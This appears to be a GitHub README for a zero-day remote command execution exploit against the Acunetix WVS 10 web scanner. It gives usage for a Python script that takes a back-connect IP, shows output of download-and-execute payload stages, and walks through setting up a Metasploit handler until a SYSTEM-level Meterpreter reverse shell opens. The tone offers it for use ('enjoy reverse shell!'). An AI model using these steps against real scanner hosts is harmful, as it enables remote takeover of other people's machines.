# acunetix_0day
Acunetix 0day RCE

#Usage

Run script with <localport> <backconnect-ip>

```
dzonerzy:dvm dzonerzy$ python /Users/dzonerzy/PycharmProjects/natbypass/acu0day.py  9999 172.16.24.1


Acunetix WVS 10 - SYSTEM Remote Command Execution (Daniele Linguaglossa)
Payload: Meterpreter reverse TCP 4444
Exploit started on port *:9999
[+] Waiting for scanner...
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (2100) bytes !
[*] Triggering EXPLOIT_STAGE_2 sending (5068) bytes !
[*] Sleeping 1 minutes to elevate privileges...ZzZz
[!] Stopping server !
[!] Exploit successful wait for session!
```
Then start a metasploit session and listen on port 4444

```
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

Start a new scan with Acunetix using your local ip and enjoy reverse shell!

```
msf exploit(handler) > run

[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.24.192
[*] Meterpreter session 1 opened (172.16.24.1:4444 -> 172.16.24.192:51782) at 2016-05-02 15:02:31 +0200

meterpreter > getprivs
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeTcbPrivilege
  SeAssignPrimaryTokenPrivilege
  SeLockMemoryPrivilege
  SeIncreaseQuotaPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeCreatePermanentPrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeAuditPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeUndockPrivilege
  SeManageVolumePrivilege
  ```
  
\#dzonerzy
